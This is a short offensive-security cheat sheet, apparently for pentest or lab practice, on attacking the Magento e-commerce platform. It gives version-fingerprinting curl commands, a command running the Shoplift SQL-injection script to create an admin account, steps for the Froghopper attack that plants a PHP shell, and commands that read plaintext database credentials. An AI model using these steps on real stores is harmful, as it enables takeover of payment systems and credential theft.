# Magento

**What it is:** E-commerce CMS platform owned by Adobe. Handles payment processing, making it a high-value target. Shoplift and other bugs allow unauthenticated admin access and RCE.

**Default ports:** 80, 443

**Vuln research:**
- [Magento Security Center](https://helpx.adobe.com/security/products/magento.html)
- [SearchSploit: `searchsploit magento`](https://www.exploit-db.com/search?q=magento)
- [Sansec — Magento Security Research](https://sansec.io/research)

---

### Identify Magento version

Check specific files and headers

```bash
curl -s http://$IP/RELEASE_NOTES.txt | head -5
curl -s http://$IP/magento_version
curl -s http://$IP/ | grep "Magento"
# Admin panel usually at: /admin or /index.php/admin
```

---

### Magento Shoplift (CVE-2015-1397)

SQL injection → Admin access — Magento < 1.9.2.0

```bash
python2 shoplift.py http://$IP/
# Creates admin account: forme:forme
```

---

### Magento authenticated RCE

After admin access — Install malicious package or edit templates

```bash
# System → Filesystem → IDE → Edit a PHP file
# Or install a malicious Magento Connect package
# Or use Froghopper attack:
# 1. Admin → Allow symlinks in template settings
# 2. Upload PHP shell as image (via category)
# 3. Create newsletter template with symlink to shell
```

---

### Magento database credentials

app/etc/local.xml or app/etc/env.php — Plaintext DB creds

```bash
cat /var/www/html/app/etc/local.xml | grep -A5 "connection"
cat /var/www/html/app/etc/env.php | grep -A5 "connection"
```

---
